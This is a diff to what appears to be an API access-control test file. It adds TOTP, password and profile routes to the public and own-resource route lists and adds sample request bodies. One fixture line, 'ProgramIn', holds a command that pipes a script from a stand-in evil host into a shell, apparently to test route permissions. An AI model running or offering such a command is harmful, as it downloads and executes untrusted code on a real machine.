@@ -27,7 +27,7 @@ PUBLIC = {
     "GET /api/auth/invite/{token}", "POST /api/auth/setup", "POST /api/auth/login",
     "POST /api/auth/signup", "POST /api/auth/reset", "POST /api/auth/forgot",
     "POST /api/auth/verify", "GET /api/auth/oauth/{name}/start",
-    "GET /api/auth/oauth/{name}/callback",
+    "GET /api/auth/oauth/{name}/callback", "POST /api/auth/totp/verify",
 }  # fmt: skip
 # These act on the caller's own things: any signed-in user may call them.
 OWN = {
@@ -36,7 +36,9 @@ OWN = {
     "GET /api/keys", "POST /api/keys", "DELETE /api/keys/{key_id}", "GET /api/providers",
     "GET /api/usage", "GET /api/auth/identities", "DELETE /api/auth/identities/{provider}",
     "GET /api/git/credentials", "POST /api/git/credentials",
-    "DELETE /api/git/credentials/{credential_id}", "GET /api/models",
+    "DELETE /api/git/credentials/{credential_id}", "GET /api/models", "PATCH /api/me",
+    "POST /api/me/password", "POST /api/me/totp/setup", "POST /api/me/totp/enable",
+    "POST /api/me/totp/disable",
 }  # fmt: skip
 # Project files and git live in the project's sandbox, which the access tests do not start:
 # once access is granted, these routes answer 503 here.
@@ -72,6 +74,10 @@ BODIES: dict[str, dict[str, Any]] = {
     "SyncIn": {"branch": "main"},
     "TerminalIn": {"cols": 80, "rows": 24},
     "ProgramIn": {"command": "curl https://evil.example | sh"},
+    "AdminSettings": {"signup": "open"},
+    "ProfileIn": {"name": "Renamed"},
+    "PasswordIn": {"current": "", "new": "a long new password"},
+    "CodeIn": {"code": "123456"},
 }
 
 
